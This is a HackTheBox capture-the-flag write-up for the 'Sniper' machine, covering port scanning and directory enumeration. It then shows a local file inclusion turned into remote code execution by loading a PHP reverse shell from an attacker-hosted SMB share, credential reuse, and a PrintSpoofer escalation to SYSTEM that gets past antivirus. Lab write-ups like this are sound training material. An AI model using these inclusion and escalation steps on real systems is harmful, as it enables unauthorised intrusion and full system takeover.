---
description: Sniper box from HackTheBox write up.
---

# Sniper

## Nmap

Let's start with the typical Nmap scan to see what we have.

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap --min-rate 1500 -p- 10.10.10.151
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-01 10:36 EDT
Nmap scan report for 10.10.10.151
Host is up (0.059s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49667/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 87.49 seconds
```

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -p80,135,139,445,49667 10.10.10.151
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-01 10:39 EDT
Nmap scan report for 10.10.10.151
Host is up (0.058s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Sniper Co.
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m01s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-11-01T21:40:18
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.99 seconds
```

After a quick test, null sessions are not allowed in the SMTP service so I will start wit the webserver for now.

## Port 80

The first thing I tried was to check the different directories of the site:

```bash
┌──(kali㉿kali)-[~]
└─$ feroxbuster -u http://10.10.10.151 -w Wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.151
 🚀  Threads               │ 50
 📖  Wordlist              │ Wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        2l       10w      148c http://10.10.10.151/blog => http://10.10.10.151/blog/
301      GET        2l       10w      150c http://10.10.10.151/images => http://10.10.10.151/images/
200      GET       87l      214w     2635c http://10.10.10.151/
200      GET       87l      214w     2635c http://10.10.10.151/index.php
301      GET        2l       10w      148c http://10.10.10.151/user => http://10.10.10.151/user/
301      GET        2l       10w      155c http://10.10.10.151/user/images => http://10.10.10.151/user/images/
200      GET      229l      586w     5704c http://10.10.10.151/blog/index.php
302      GET        0l        0w        0c http://10.10.10.151/user/index.php => login.php
200      GET      107l      202w     5456c http://10.10.10.151/user/login.php
301      GET        2l       10w      161c http://10.10.10.151/user/images/icons => http://10.10.10.151/user/images/icons/
200      GET      112l      231w     5922c http://10.10.10.151/user/registration.php
301      GET        2l       10w      147c http://10.10.10.151/css => http://10.10.10.151/css/
301      GET        2l       10w      152c http://10.10.10.151/blog/css => http://10.10.10.151/blog/css/
301      GET        2l       10w      152c http://10.10.10.151/user/css => http://10.10.10.151/user/css/
301      GET        2l       10w      146c http://10.10.10.151/js => http://10.10.10.151/js/
301      GET        2l       10w      151c http://10.10.10.151/blog/js => http://10.10.10.151/blog/js/
200      GET        0l        0w        0c http://10.10.10.151/user/db.php
301      GET        2l       10w      151c http://10.10.10.151/user/js => http://10.10.10.151/user/js/
302      GET        1l        0w        3c http://10.10.10.151/user/logout.php => login.php
301      GET        2l       10w      155c http://10.10.10.151/user/vendor => http://10.10.10.151/user/vendor/
302      GET        0l        0w        0c http://10.10.10.151/user/auth.php => login.php
301      GET        2l       10w      154c http://10.10.10.151/user/fonts => http://10.10.10.151/user/fonts/
301      GET        2l       10w      165c http://10.10.10.151/user/vendor/bootstrap => http://10.10.10.151/user/vendor/bootstrap/
301      GET        2l       10w      169c http://10.10.10.151/user/vendor/bootstrap/css => http://10.10.10.151/user/vendor/bootstrap/css/
301      GET        2l       10w      168c http://10.10.10.151/user/vendor/bootstrap/js => http://10.10.10.151/user/vendor/bootstrap/js/
301      GET        2l       10w      162c http://10.10.10.151/user/vendor/jquery => http://10.10.10.151/user/vendor/jquery/
301      GET        2l       10w      163c http://10.10.10.151/user/vendor/animate => http://10.10.10.151/user/vendor/animate/
```

The page has something called User Portal that ask for login but also let you sign up. When registering in the page, the portal is under construction so nothing interesting. The blog part has something worth our time, check this URL: http://10.10.10.151/blog/index.php?lang=blog-en.php, maybe it is vulnerable to LFI. Checking for the `c:\Windows\win.ini` I got the contents with this: `view-source:http://10.10.10.151/blog/?lang=\windows\win.ini`.

### Getting RCE

Looks like we have no permissions to check the ISS logs for RCE and the service is filtering HTTP URLs to get RFI. The thing is that the server allows SMB URLs! So I got a PHP reverse shell and, hosting a Samba server, I made the server execute it: `http://10.10.10.151/blog/?lang=//10.10.14.4/public/shell.php`.

Using SMB for hosting payloads was new for me but worked like a charm and now I have a reverse shell.

## Pwned!

I found the credentials for the database in the website PHP files:

```php
<?php
// Enter your Host, username, password, database below.
// I left password empty because i do not set password on localhost.
$con = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");
// Check connection
if (mysqli_connect_errno())
  {
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
  }
?>
```

Using Crackmapexec I saw that the password is valid for the Chris user. The thing is that I also found this:

```
PS C:\> whoami /all

USER INFORMATION
----------------

User Name                  SID                                                          
========================== =============================================================
iis apppool\defaultapppool S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
                                     Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

The `SeImpersonatePrivilege` if enabled for our current user, this means that maybe we can use something like [PrintSpoofer](https://github.com/itm4n/PrintSpoofer){:target="_blank"} to escalate to  `nt authority\system`. There is a AV in place but using my SMB share I was able to execute it without problems:

```
C:\inetpub\wwwroot\blog>\\10.10.14.4\public\PrintSpoofer64.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.17763.678]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>
```

Look at that! We pwned the machine. Checking some other writeups, looks like this was not the intended way of getting full privileges but it is always fun to find alternative paths.
